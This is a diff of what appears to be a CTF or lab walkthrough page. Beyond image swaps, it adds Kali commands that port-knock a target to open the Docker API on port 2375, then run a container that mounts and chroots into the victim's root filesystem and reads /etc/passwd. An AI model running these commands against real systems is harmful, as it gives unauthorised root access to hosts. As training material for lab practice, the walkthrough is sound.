@@ -80,31 +80,92 @@ curl http://$VICTIM/robots.txt
 
 
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>
 
 
 
 
 
-
-
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>
 
 
 
 
 
+<figure><img src="../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>
 
 
 
 
 
+<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+git clone https://github.com/grongor/knock.git
+cd knock
+./knock $VICTIM 42 1337 10420 6969 63000
+nmap $VICTIM -p 2375
+```
+
+<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+subl /etc/docker/daemon.json
+```
+
+**daemon.json**
+
+```
+{
+  "insecure-registries" : ["10.10.90.88:2375"]
+}
+```
+
+**Kali**
+
+```
+sudo systemctl stop docker
+```
+
+Wait 30 seconds
+
+**Kali**
+
+```
+sudo systemctl start docker
+```
+
+**Kali**
+
+```
+docker -H $VICTIM:2375 images
+docker -H $VICTIM:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
+cat /etc/passwd
+```
+
+<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>
 
 
 
